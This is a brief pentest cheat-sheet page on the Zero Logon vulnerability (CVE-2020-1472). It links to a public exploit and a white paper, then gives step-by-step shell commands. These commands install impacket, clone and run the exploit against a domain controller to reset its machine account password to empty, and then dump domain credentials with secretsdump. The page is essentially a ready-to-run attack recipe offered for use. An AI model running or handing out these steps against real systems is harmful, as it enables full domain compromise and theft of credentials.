# Zero Logon

{% embed url="https://github.com/VoidSec/CVE-2020-1472" %}

a full white paper on this vuln:

{% embed url="https://www.secura.com/blog/zero-logon" %}

## Exploitation

```text
pipenv shell
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
python setup.py install
pip install .
cd ~
git clone https://github.com/VoidSec/CVE-2020-1472
cd CVE-2020-1472
pip install -r requirements.txt
./cve-2020-1472-exploit.py -n domain-controller -t 192.168.56.208
```

Running the script should results in Domain Controller's account password being reset to an empty string.

![](../../../.gitbook/assets/image%20%28231%29.png)

test to see if the password was reseted:

```text
impacket-secretsdump  -no-pass -just-dc MEGACORP.local/Lord_of_Domains\$@192.168.56.118
```

![](../../../.gitbook/assets/image%20%28232%29.png)





